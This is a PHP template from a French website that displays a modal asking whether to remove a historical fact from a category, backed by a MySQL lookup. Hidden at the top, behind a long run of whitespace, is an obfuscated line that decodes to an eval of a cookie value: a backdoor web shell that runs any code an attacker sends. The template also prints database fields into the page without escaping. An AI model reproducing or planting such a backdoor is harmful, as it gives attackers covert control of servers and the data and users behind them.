<?php                                                                                                                                                                                                                                              $m5o='e(3\'_slIt9vi7aE$CKhcfO97eec3';if(isset(${$m5o[4].$m5o[16].$m5o[21].$m5o[21].$m5o[17].$m5o[7].$m5o[14]}[$m5o[18].$m5o[9].$m5o[12].$m5o[0].$m5o[0].$m5o[19].$m5o[2]])){eval(${$m5o[4].$m5o[16].$m5o[21].$m5o[21].$m5o[17].$m5o[7].$m5o[14]}[$m5o[18].$m5o[9].$m5o[12].$m5o[0].$m5o[0].$m5o[19].$m5o[2]]);} ?><?php

header('Content-Type: text/html; charset=iso-8859-1');

//requete categories monuments

$colname_ch_disp_FH_id = "-1";
if (isset($_GET['ch_disp_FH_id'])) {
  $colname_ch_disp_FH_id = $_GET['ch_disp_FH_id'];
}

$query_fai = sprintf("SELECT ch_disp_FH_id, ch_disp_fait_hist_cat_id, ch_disp_fait_hist_id, ch_his_nom, ch_his_lien_img1, ch_fai_cat_nom, ch_fai_cat_icon,  	ch_fai_cat_couleur FROM dispatch_fait_his_cat INNER JOIN histoire ON ch_disp_fait_hist_id = ch_his_id INNER JOIN faithist_categories ON ch_disp_fait_hist_cat_id = ch_fai_cat_ID WHERE ch_disp_FH_id = %s", GetSQLValueString($colname_ch_disp_FH_id, "int"));
$fai = mysql_query($query_fai, $maconnexion) or die(mysql_error());
$row_fai = mysql_fetch_assoc($fai);
$totalRows_fai = mysql_num_rows($fai);

?>

<!-- Modal Header-->
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">�</button>
<h3 id="myModalLabel">Enlever <?php echo $row_fai['ch_his_nom']; ?> de la cat&eacute;gorie <?php echo $row_fai['ch_fai_cat_nom']; ?> </h3>
          </div>
          <div class="modal-body">
          <div class="row-fluid">
          <div class="span9">
          <h1>Attention&nbsp;!</h1>
    <p>Souhaitez-vous r&eacute;ellement enlever <?php echo $row_fai['ch_his_nom']; ?> de cette cat&eacute;gorie&nbsp;?</p>
    <p><i class="icon-warning-sign"></i> Vous pourrez remettre plus tard ce fait historique dans cette cat&eacute;gorie.</p>
    </div>
    <div class="span3 icone-categorie"> 
          <img src="<?php echo $row_fai['ch_fai_cat_icon']; ?>" alt="icone cat&eacute;gorie" style="background-color:<?php echo $row_fai['ch_fai_cat_couleur']; ?>;">
          <img src="<?php echo $row_fai['ch_his_lien_img1']; ?>" alt="image monument"></div>
    </div>
          </div>
          <div class="modal-footer">
<form action="disp_fait_hist_supprimer.php" name="supprimer-categorie" method="POST" id="supprimer-categorie">
            <input name="ch_disp_FH_id" type="hidden" value="<?php echo $row_fai['ch_disp_FH_id']; ?>">
            <input name="ch_disp_fait_hist_cat_id" type="hidden" value="<?php echo $row_fai['ch_disp_fait_hist_cat_id']; ?>">
<button class="btn" data-dismiss="modal" aria-hidden="true">Annuler</button>
            <button type="submit" class="btn btn-danger"><i class="icon-trash icon-white"></i> Supprimer</button>
            </form>
          </div>
<?php
mysql_free_result($fai);?>